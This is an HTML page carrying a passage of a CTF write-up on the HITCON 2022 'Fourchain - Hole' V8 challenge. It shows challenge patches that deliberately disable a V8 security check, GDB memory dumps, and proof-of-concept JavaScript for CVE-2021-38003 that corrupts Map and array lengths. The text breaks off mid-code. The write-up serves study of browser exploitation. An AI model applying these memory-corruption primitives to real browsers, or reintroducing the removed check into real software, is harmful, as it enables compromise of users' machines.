@@ -1,0 +1,676 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Fourchain - Hole | Organisers</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Fourchain - Hole" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="CTF Team" />
+<meta property="og:description" content="CTF Team" />
+<link rel="canonical" href="https://org.anize.rs/HITCON-2022/pwn/fourchain-hole.html" />
+<meta property="og:url" content="https://org.anize.rs/HITCON-2022/pwn/fourchain-hole.html" />
+<meta property="og:site_name" content="Organisers" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Fourchain - Hole" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"CTF Team","headline":"Fourchain - Hole","url":"https://org.anize.rs/HITCON-2022/pwn/fourchain-hole.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+    <meta property="og:image" content="https://org.anize.rs/assets/images/logo.png" />
+    <meta name="twitter:card" content="summary" />
+    <!-- TODO <meta name="twitter:description" content="" /> -->
+    <meta name="twitter:title" content="Organisers" />
+    <meta name="twitter:site" content="@0rganizers" />
+    <!-- TODO <meta name="twitter:image" content="" /> -->
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#040d21">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Hack monospace font -->
+    <link rel='stylesheet' href='//cdn.jsdelivr.net/npm/hack-font@3.3.0/build/web/hack.css'>
+    <link rel="stylesheet" href="/assets/css/style.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/highlight.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/light.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+
+    <!-- legitimize current Mastodon profile via link verification -->
+    <link rel="me" href="https://infosec.exchange/@organizers" />
+
+
+    <script type="text/javascript">
+        function isLightThemeSelected() {
+          return document.cookie.match(/theme=light/i) != null
+        }
+
+        function setThemeFromCookie() {
+            var html = document.getElementsByTagName('html')[0]
+            html.className = isLightThemeSelected() ? 'light-theme' : 'dark-theme'
+            console.log('Loaded cookie: ' + document.cookie)
+        }
+
+        (function() {
+          setThemeFromCookie()
+        })();
+    </script>
+
+    <script type="text/javascript">
+        function getFootnoteContent(linkId) {
+            const fnId = linkId.replace(/^fnref/, 'fn');
+            return document.getElementById(fnId).querySelector("p").innerHTML;
+        }
+
+        function addFootnote(element, content) {
+            const footnote = document.createElement('div');
+            footnote.classList.add('footnote-box');
+            // Also add the footnote number
+            footnote.innerHTML = `<sup>${element.innerText}</sup> ${content}`;
+            footnote.querySelectorAll('a.reversefootnote').forEach((backlink) => {
+                footnote.removeChild(backlink);
+            });
+            element.insertAdjacentElement('afterend', footnote);
+            element.dataset.toggled = '1';
+        }
+
+        function removeFootnote(element) {
+            element.parentElement.removeChild(element.nextSibling);
+            element.dataset.toggled = '0';
+        }
+
+
+        window.addEventListener("load", function() {
+            document.querySelectorAll("a.footnote").forEach((el) => {
+                const sup = el.parentElement;
+                el.addEventListener("click", (event) => {
+                    const isOpen = Number.parseInt(sup.dataset.toggled || '0');
+                    if (!isOpen) {
+                        addFootnote(sup, getFootnoteContent(sup.id));
+                    } else {
+                        removeFootnote(sup);
+                    }
+                    event.preventDefault();
+                });
+            });
+        });
+    </script>
+
+    <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      "HTML-CSS": {
+        fonts: ["Gyre-Pagella"],
+        imageFont: null,
+        undefinedFamily: "'Arial Unicode MS', cmbright"
+      },
+      tex2jax: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']],
+        processEscapes: true
+      }
+    });
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-AMS_HTML"></script>
+  </head>
+  
+  <body> 
+    <header class="page-header-simple" role="banner">
+      
+      <div class="left-links"><a id="header-logo" href="/">Organi{s|z}ers</a></div>
+      <div class="right-links">
+        <a href="/writeups">Writeups</a>
+        <a href="/achievements">Achievements</a>
+      </div>
+    </header>
+
+    <main id="content" class="main-content" role="main">
+      <h1 id="fourchain---hole">Fourchain - Hole</h1>
+
+<p><strong>Authors:</strong> <a href="https://twitter.com/_MatteoRizzo">Nspace</a></p>
+
+<p><strong>Tags:</strong> pwn, browser, v8</p>
+
+<p><strong>Points:</strong> 268</p>
+
+<blockquote>
+  <p>There’s a hole in the program ?
+Well I’m sure it’s not that of a big deal, after all it’s just a small hole that won’t do any damage right ?
+… Right 😨 ?</p>
+</blockquote>
+
+<h2 id="analysis">Analysis</h2>
+
+<p>NOTE: this writeup assumes some familiarity with V8 internals such as how objects are laid out in memory, pointer compression, and pointer tagging.</p>
+
+<p>The challenge gives us patched d8, built from v8 commit <code class="language-plaintext highlighter-rouge">63cb7fb817e60e5633fb622baf18c59da7a0a682</code>. There are two patch files included in the challenge:</p>
+
+<p><code class="language-plaintext highlighter-rouge">add_hole.patch</code></p>
+<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gh">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
+index 6e0cd408e7..aafdfb8544 100644
+</span><span class="gd">--- a/src/builtins/builtins-array.cc
+</span><span class="gi">+++ b/src/builtins/builtins-array.cc
+</span><span class="p">@@ -395,6 +395,12 @@</span> BUILTIN(ArrayPush) {
+   return *isolate-&gt;factory()-&gt;NewNumberFromUint((new_length));
+ }
+ 
+<span class="gi">+BUILTIN(ArrayHole){
++    uint32_t len = args.length();
++    if(len &gt; 1) return ReadOnlyRoots(isolate).undefined_value();
++    return ReadOnlyRoots(isolate).the_hole_value();
++}
++
+</span> namespace {
+ 
+ V8_WARN_UNUSED_RESULT Object GenericArrayPop(Isolate* isolate,
+<span class="gh">diff --git a/src/builtins/builtins-collections-gen.cc b/src/builtins/builtins-collections-gen.cc
+index 78b0229011..55aaaa03df 100644
+</span><span class="gd">--- a/src/builtins/builtins-collections-gen.cc
+</span><span class="gi">+++ b/src/builtins/builtins-collections-gen.cc
+</span><span class="p">@@ -1763,7 +1763,7 @@</span> TF_BUILTIN(MapPrototypeDelete, CollectionsBuiltinsAssembler) {
+                          "Map.prototype.delete");
+ 
+   // This check breaks a known exploitation technique. See crbug.com/1263462
+<span class="gd">-  CSA_CHECK(this, TaggedNotEqual(key, TheHoleConstant()));
+</span><span class="gi">+  //CSA_CHECK(this, TaggedNotEqual(key, TheHoleConstant()));
+</span> 
+   const TNode&lt;OrderedHashMap&gt; table =
+       LoadObjectField&lt;OrderedHashMap&gt;(CAST(receiver), JSMap::kTableOffset);
+<span class="gh">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
+index 0e98586f7f..28a46f2856 100644
+</span><span class="gd">--- a/src/builtins/builtins-definitions.h
+</span><span class="gi">+++ b/src/builtins/builtins-definitions.h
+</span><span class="p">@@ -413,6 +413,7 @@</span> namespace internal {
+   TFJ(ArrayPrototypeFlat, kDontAdaptArgumentsSentinel)                         \
+   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \
+   TFJ(ArrayPrototypeFlatMap, kDontAdaptArgumentsSentinel)                      \
+<span class="gi">+  CPP(ArrayHole)                                                               \
+</span>                                                                                \
+   /* ArrayBuffer */                                                            \
+   /* ES #sec-arraybuffer-constructor */                                        \
+<span class="gh">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
+index 79bdfbddcf..c42ad4c789 100644
+</span><span class="gd">--- a/src/compiler/typer.cc
+</span><span class="gi">+++ b/src/compiler/typer.cc
+</span><span class="p">@@ -1722,6 +1722,8 @@</span> Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
+       return Type::Receiver();
+     case Builtin::kArrayUnshift:
+       return t-&gt;cache_-&gt;kPositiveSafeInteger;
+<span class="gi">+    case Builtin::kArrayHole:
++      return Type::Oddball();
+</span> 
+     // ArrayBuffer functions.
+     case Builtin::kArrayBufferIsView:
+<span class="gh">diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc
+index 9040e95202..a77333287a 100644
+</span><span class="gd">--- a/src/init/bootstrapper.cc
+</span><span class="gi">+++ b/src/init/bootstrapper.cc
+</span><span class="p">@@ -1800,6 +1800,7 @@</span> void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,
+                           Builtin::kArrayPrototypeFindIndex, 1, false);
+     SimpleInstallFunction(isolate_, proto, "lastIndexOf",
+                           Builtin::kArrayPrototypeLastIndexOf, 1, false);
+<span class="gi">+    SimpleInstallFunction(isolate_, proto, "hole", Builtin::kArrayHole, 0, false);
+</span>     SimpleInstallFunction(isolate_, proto, "pop", Builtin::kArrayPrototypePop,
+                           0, false);
+     SimpleInstallFunction(isolate_, proto, "push", Builtin::kArrayPrototypePush,
+
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">d8_strip_global.patch</code></p>
+<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gh">diff --git a/src/d8/d8-posix.cc b/src/d8/d8-posix.cc
+index c2571ef3a01..e4f27cfdca6 100644
+</span><span class="gd">--- a/src/d8/d8-posix.cc
+</span><span class="gi">+++ b/src/d8/d8-posix.cc
+</span><span class="p">@@ -734,6 +734,7 @@</span> char* Shell::ReadCharsFromTcpPort(const char* name, int* size_out) {
+ }
+ 
+ void Shell::AddOSMethods(Isolate* isolate, Local&lt;ObjectTemplate&gt; os_templ) {
+<span class="gi">+/*    
+</span>   if (options.enable_os_system) {
+     os_templ-&gt;Set(isolate, "system", FunctionTemplate::New(isolate, System));
+   }
+<span class="p">@@ -748,6 +749,7 @@</span> void Shell::AddOSMethods(Isolate* isolate, Local&lt;ObjectTemplate&gt; os_templ) {
+                 FunctionTemplate::New(isolate, MakeDirectory));
+   os_templ-&gt;Set(isolate, "rmdir",
+                 FunctionTemplate::New(isolate, RemoveDirectory));
+<span class="gi">+*/
+</span> }
+ 
+ }  // namespace v8
+<span class="gh">diff --git a/src/d8/d8.cc b/src/d8/d8.cc
+index c6bacaa732f..63b3c9c27e8 100644
+</span><span class="gd">--- a/src/d8/d8.cc
+</span><span class="gi">+++ b/src/d8/d8.cc
+</span><span class="p">@@ -3266,6 +3266,7 @@</span> static void AccessIndexedEnumerator(const PropertyCallbackInfo&lt;Array&gt;&amp; info) {}
+ 
+ Local&lt;ObjectTemplate&gt; Shell::CreateGlobalTemplate(Isolate* isolate) {
+   Local&lt;ObjectTemplate&gt; global_template = ObjectTemplate::New(isolate);
+<span class="gi">+  /*
+</span>   global_template-&gt;Set(Symbol::GetToStringTag(isolate),
+                        String::NewFromUtf8Literal(isolate, "global"));
+   global_template-&gt;Set(isolate, "version",
+<span class="p">@@ -3284,6 +3285,7 @@</span> Local&lt;ObjectTemplate&gt; Shell::CreateGlobalTemplate(Isolate* isolate) {
+                        FunctionTemplate::New(isolate, ReadLine));
+   global_template-&gt;Set(isolate, "load",
+                        FunctionTemplate::New(isolate, ExecuteFile));
+<span class="gi">+  */
+</span>   global_template-&gt;Set(isolate, "setTimeout",
+                        FunctionTemplate::New(isolate, SetTimeout));
+   // Some Emscripten-generated code tries to call 'quit', which in turn would
+<span class="p">@@ -3456,6 +3458,7 @@</span> Local&lt;FunctionTemplate&gt; Shell::CreateSnapshotTemplate(Isolate* isolate) {
+ }
+ Local&lt;ObjectTemplate&gt; Shell::CreateD8Template(Isolate* isolate) {
+   Local&lt;ObjectTemplate&gt; d8_template = ObjectTemplate::New(isolate);
+<span class="gi">+  /*
+</span>   {
+     Local&lt;ObjectTemplate&gt; file_template = ObjectTemplate::New(isolate);
+     file_template-&gt;Set(isolate, "read",
+<span class="p">@@ -3538,6 +3541,7 @@</span> Local&lt;ObjectTemplate&gt; Shell::CreateD8Template(Isolate* isolate) {
+                               Local&lt;Signature&gt;(), 1));
+     d8_template-&gt;Set(isolate, "serializer", serializer_template);
+   }
+<span class="gi">+  */
+</span>   return d8_template;
+ }
+</code></pre></div></div>
+
+<p>The second patch, <code class="language-plaintext highlighter-rouge">d8_strip_global.patch</code> is simply removing some builtin functions that programs running in d8 normally have access to. These functions let a JavaScript program do things like open and read files, and they would trivialize the challenge if our exploit could use them. This is pretty standard for V8 challenges.</p>
+
+<p>The first patch, <code class="language-plaintext highlighter-rouge">add_hole.patch</code>, is the interesting part. It adds a new method called <code class="language-plaintext highlighter-rouge">hole</code> to <code class="language-plaintext highlighter-rouge">Array.prototype</code>. The new method is implemented as a C++ builtin, in the function <code class="language-plaintext highlighter-rouge">ArrayHole</code>. The function doesn’t do much, and just returns a special value called <code class="language-plaintext highlighter-rouge">the_hole</code>.</p>
+
+<p><code class="language-plaintext highlighter-rouge">the_hole</code> in V8 is a special object that the engine uses internally to represent the absence of a value. For example, when a JavaScript program creates a sparse array, V8 stores <code class="language-plaintext highlighter-rouge">the_hole</code> in all uninitialized array slots.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">];</span>
+<span class="nx">a</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span> 
+<span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DebugPrint: 0x2ef200108b7d: [JSArray]
+ - elements: 0x2ef200108b8d &lt;FixedArray[31]&gt; [HOLEY_SMI_ELEMENTS]
+ - length: 10
+ - elements: 0x2ef200108b8d &lt;FixedArray[31]&gt; {
+           0: 1
+           1: 2
+         2-8: 0x2ef200002459 &lt;the_hole&gt;
+           9: 3
+       10-30: 0x2ef200002459 &lt;the_hole&gt;
+ }
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">the_hole</code> is an implementation detail that is not part of the JS standard and is normally invisible to JS code. For example if a program tries to access a slot that contains <code class="language-plaintext highlighter-rouge">the_hole</code> in a sparse array, the access returns <code class="language-plaintext highlighter-rouge">undefined</code> and not <code class="language-plaintext highlighter-rouge">the_hole</code>.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">];</span>
+<span class="nx">a</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span> 
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">a</span><span class="p">[</span><span class="mi">8</span><span class="p">]);</span>
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>undefined
+</code></pre></div></div>
+
+<p>The author’s patch adds a way to get a reference to this normally inaccessible object from JS code. This is interesting from a security perspective because it’s likely that many of the built-in functions don’t expect to be passed <code class="language-plaintext highlighter-rouge">the_hole</code> as an argument and might misbehave when that happens. For example the following snippet crashes d8:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">the_hole</span> <span class="o">=</span> <span class="p">[].</span><span class="nx">hole</span><span class="p">();</span>
+<span class="nx">the_hole</span><span class="p">.</span><span class="nx">toString</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>The patch also comments out some code that references <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1263462">a bug</a> in Chromium’s bug tracker. The bug describes how a reference to <code class="language-plaintext highlighter-rouge">the_hole</code> can be used to cause memory corruption.</p>
+
+<blockquote>
+  <p>It appears that a leaked TheHole value can be used to cause memory corruption due to special handling of TheHole values in JSMaps:</p>
+
+  <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="kd">var</span> <span class="nx">map</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Map</span><span class="p">();</span>
+   <span class="nx">map</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+   <span class="nx">map</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="nx">hole</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+   <span class="c1">// Due to special handling of hole values, this ends up setting the size of the map to -1</span>
+   <span class="nx">map</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="nx">hole</span><span class="p">);</span>
+   <span class="nx">map</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="nx">hole</span><span class="p">);</span>
+   <span class="nx">map</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+
+   <span class="c1">// Size is now -1</span>
+   <span class="c1">//print(map.size);</span>
+
+   <span class="c1">// Set values in the map, which presumably ends up corrupting data in front of</span>
+   <span class="c1">// the map storage due to the size being -1</span>
+   <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">100</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+       <span class="nx">map</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+   <span class="p">}</span>
+
+  <span class="c1">// Optionally trigger heap verification if the above didn't already crash</span>
+  <span class="c1">//gc();</span>
+</code></pre></div>  </div>
+
+  <p>I haven’t verified exactly why this happens, but my guess is that because the TheHole value is used by JSMaps to indicate deleted entries [8], when the code deletes TheHole for the second time, it effectively double-deletes an entry and so decrements the size twice.
+[8] https://source.chromium.org/chromium/chromium/src/+/main:v8/src/builtins/builtins-collections-gen.cc;l=1770;drc=1c3085e26a408adb53645f9b5d12fa9f3803df3c</p>
+</blockquote>
+
+<p>The check that the challenge author commented out was introduced in response to this bug and breaks the exploitation technique described above. This makes it pretty clear that that’s how the author wants us to solve the challenge.</p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p>The exploit described in the chromium bug uses <code class="language-plaintext highlighter-rouge">the_hole</code> to set the length of a JavaScript map to -1. In order to understand what primitives that gives us we first have to find the code that implements the map object and understand how it works.</p>
+
+<p><code class="language-plaintext highlighter-rouge">JSMap</code>, the C++ object that represents a JavaScript map is declared in <a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/js-collection.tq;l=11;drc=f30f4815254b8eed9b23026ea0d984d18bb89c28"><code class="language-plaintext highlighter-rouge">js-collection.tq</code></a> and it is basically the same as a <code class="language-plaintext highlighter-rouge">JSCollection</code>. <code class="language-plaintext highlighter-rouge">JSCollection</code> only has one field, called <code class="language-plaintext highlighter-rouge">table</code> which points to the backing hash table. Sadly the field has type <code class="language-plaintext highlighter-rouge">Object</code> which can point to any JavaScript object. Not very useful. Looking for references to the generated method <code class="language-plaintext highlighter-rouge">JSCollection::table()</code> we find <a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/objects.cc;l=6556;drc=2df668b7cbf6c1d0766b6ee0ae8147adc8830f2e">some code</a> that indicates that <code class="language-plaintext highlighter-rouge">table</code> is actually of type <a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/ordered-hash-table.h;l=306;drc=2df668b7cbf6c1d0766b6ee0ae8147adc8830f2e"><code class="language-plaintext highlighter-rouge">OrderedHashMap</code></a>. <code class="language-plaintext highlighter-rouge">OrderedHashMap</code> is itself a subclass of <code class="language-plaintext highlighter-rouge">OrderedHashTable</code>, which has a <a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/ordered-hash-table.h;l=23;drc=2df668b7cbf6c1d0766b6ee0ae8147adc8830f2e">detailed comment</a> describing how the contents of the table are laid out in memory. Cool!</p>
+
+<p>The memory layout of a <code class="language-plaintext highlighter-rouge">OrderedHashTable</code> (and <code class="language-plaintext highlighter-rouge">OrderedHashMap</code>) is this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[0]: element count
+[1]: deleted element count
+[2]: bucket count
+[3..(3 + NumberOfBuckets() - 1)]: "hash table",
+                         where each item is an offset into the
+                         data table (see below) where the first
+                         item in this bucket is stored.
+[3 + NumberOfBuckets()..length]: "data table", an
+                         array of length Capacity() * 3,
+                         where the first entrysize items are
+                         handled by the derived class and the
+                         item at kChainOffset is another entry
+                         into the data table indicating the next
+                         entry in this hash bucket.
+</code></pre></div></div>
+
+<p>In our case each element consists of two JavaScript values (the key and the value), so entrysize = 2 and each entry in the hash table will be 3 words (12 bytes) long (key, value, next element).</p>
+
+<p>In some circumstances the runtime can decide to declare the <code class="language-plaintext highlighter-rouge">OrderedHashTable</code> obsolete and create a new version. For example that can happen when too many elements are deleted from the table and the occupancy becomes too low. In that case the first word of the old table is not the element count but rather a pointer to the new <code class="language-plaintext highlighter-rouge">OrderedHashTable</code>. We can distinguish between the two by looking at the tag of the first word of the map. A Smi indicates that the map is active, and a pointer indicates that it’s obsolete.</p>
+
+<p>The layout described above is also prefixed with a pointer to a <a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/map.h;l=203;drc=2df668b7cbf6c1d0766b6ee0ae8147adc8830f2e">Map</a> object and with the overall size of the map (in words, which in this case are 4 bytes). The table’s total size is stored right after the map because <code class="language-plaintext highlighter-rouge">OrderedHashTable</code> derives from <a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/fixed-array.tq;l=8;drc=902759b8d72534a01d0f90d6653fd253885cf72f"><code class="language-plaintext highlighter-rouge">FixedArray</code></a>, which has a <code class="language-plaintext highlighter-rouge">length</code> field. I am pretty sure that this is redundant because the size of the <code class="language-plaintext highlighter-rouge">OrderdHashTable</code> is always equal to <code class="language-plaintext highlighter-rouge">3 + num_buckets * 7</code> but maybe it is stored explicitly to help the GC.</p>
+
+<p>The value that the exploit in the Chromium bug sets to -1 is the element count (as we can see in the code <a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/builtins/builtins-collections-gen.cc;l=1710;drc=63cb7fb817e60e5633fb622baf18c59da7a0a682">here</a>, linked to in the bug). We can verify that this is the case by running the code from the Chromium bug and then printing the memory of the map in GDB.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">hole</span> <span class="o">=</span> <span class="p">[].</span><span class="nx">hole</span><span class="p">();</span>
+<span class="kd">let</span> <span class="nx">map</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Map</span><span class="p">();</span>
+
+<span class="nx">map</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+<span class="nx">map</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="nx">hole</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+<span class="nx">map</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="nx">hole</span><span class="p">);</span>
+<span class="nx">map</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="nx">hole</span><span class="p">);</span>
+<span class="nx">map</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+
+<span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">map</span><span class="p">);</span>
+<span class="o">%</span><span class="nx">SystemBreak</span><span class="p">();</span>
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x1f0400048c7d &lt;Map map = 0x1f04001855f5&gt;
+Thread 1 "d8" received signal SIGTRAP, Trace/breakpoint trap.
+
+pwndbg&gt; x/4wx 0x1f0400048c7c
+                   /*  map            properties      elements       table */
+0x1f0400048c7c:	0x001855f5	0x00002259	0x00002259	0x00048c8d
+pwndbg&gt; x/4wx 0x1f0400048c8c
+                   /*  map            length          next table     deleted element count */
+0x1f0400048c8c:	0x00002c29	0x00000022	0x00048cd9    	0x00000004
+pwndbg&gt; x/4wx 0x1f0400048cd8
+                   /*  map            length          next table     deleted element count */
+0x1f0400048cd8:	0x00002c29	0x00000022	0x00048d25     0x00000002
+pwndbg&gt; x/4wx 0x1f0400048d24
+                   /*  map            length          element count  deleted element count */
+0x1f0400048d24:	0x00002c29	0x00000022	0xfffffffe     0x00000000
+</code></pre></div></div>
+
+<p>As we can see the element count is indeed -1 (whose tagged representation is 0xfffffffe).</p>
+
+<p>Now how do we exploit this? I searched online for the CVE number referenced in the Chromium bug report (CVE-2021-38003) and found <a href="https://medium.com/numen-cyber-labs/from-leaking-thehole-to-chrome-renderer-rce-183dcb6f3078">this article by Numen Cyber Labs</a> which has some more details on how to exploit the vulnerability. The article provides a PoC exploit which sets the length of an array to 0xffff.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">hole</span> <span class="o">=</span> <span class="p">[].</span><span class="nx">hole</span><span class="p">();</span>
+<span class="kd">let</span> <span class="nx">map</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Map</span><span class="p">();</span>
+<span class="nx">map</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+<span class="nx">map</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="nx">hole</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+<span class="nx">map</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="nx">hole</span><span class="p">);</span>
+<span class="nx">map</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="nx">hole</span><span class="p">);</span>
+<span class="nx">map</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">);</span>
+
+<span class="nx">map</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+<span class="nx">map</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="mh">0xffff</span><span class="p">);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>The way the exploit works is by overwriting the bucket count in the <code class="language-plaintext highlighter-rouge">OrderedHashMap</code> with 0x10, which then makes the next insertion into the map write out of bounds. To see why, let’s take a look at <a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/builtins/builtins-collections-gen.cc;l=1554;drc=63cb7fb817e60e5633fb622baf18c59da7a0a682">the code</a> that implements map insertion. I will include a simplified and commented version here for convenience.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">TF_BUILTIN</span><span class="p">(</span><span class="n">MapPrototypeSet</span><span class="p">,</span> <span class="n">CollectionsBuiltinsAssembler</span><span class="p">)</span> <span class="p">{</span>
+  <span class="c1">// ...</span>
+
+  <span class="n">BIND</span><span class="p">(</span><span class="o">&amp;</span><span class="n">add_entry</span><span class="p">);</span>
+  <span class="n">TVARIABLE</span><span class="p">(</span><span class="n">IntPtrT</span><span class="p">,</span> <span class="n">number_of_buckets</span><span class="p">);</span>
+  <span class="n">TVARIABLE</span><span class="p">(</span><span class="n">IntPtrT</span><span class="p">,</span> <span class="n">occupancy</span><span class="p">);</span>
+  <span class="n">TVARIABLE</span><span class="p">(</span><span class="n">OrderedHashMap</span><span class="p">,</span> <span class="n">table_var</span><span class="p">,</span> <span class="n">table</span><span class="p">);</span>
+  <span class="p">{</span>
+    <span class="c1">// Check we have enough space for the entry.</span>
+    <span class="n">number_of_buckets</span> <span class="o">=</span> <span class="n">SmiUntag</span><span class="p">(</span><span class="n">CAST</span><span class="p">(</span><span class="n">UnsafeLoadFixedArrayElement</span><span class="p">(</span>
+        <span class="n">table</span><span class="p">,</span> <span class="n">OrderedHashMap</span><span class="o">::</span><span class="n">NumberOfBucketsIndex</span><span class="p">())));</span>
+
+    <span class="k">static_assert</span><span class="p">(</span><span class="n">OrderedHashMap</span><span class="o">::</span><span class="n">kLoadFactor</span> <span class="o">==</span> <span class="mi">2</span><span class="p">);</span>
+    <span class="c1">// capacity = number_of_buckets * 2</span>
+    <span class="k">const</span> <span class="n">TNode</span><span class="o">&lt;</span><span class="n">WordT</span><span class="o">&gt;</span> <span class="n">capacity</span> <span class="o">=</span> <span class="n">WordShl</span><span class="p">(</span><span class="n">number_of_buckets</span><span class="p">.</span><span class="n">value</span><span class="p">(),</span> <span class="mi">1</span><span class="p">);</span>
+    <span class="c1">// Read the number of elememts.</span>
+    <span class="k">const</span> <span class="n">TNode</span><span class="o">&lt;</span><span class="n">IntPtrT</span><span class="o">&gt;</span> <span class="n">number_of_elements</span> <span class="o">=</span> <span class="n">SmiUntag</span><span class="p">(</span>
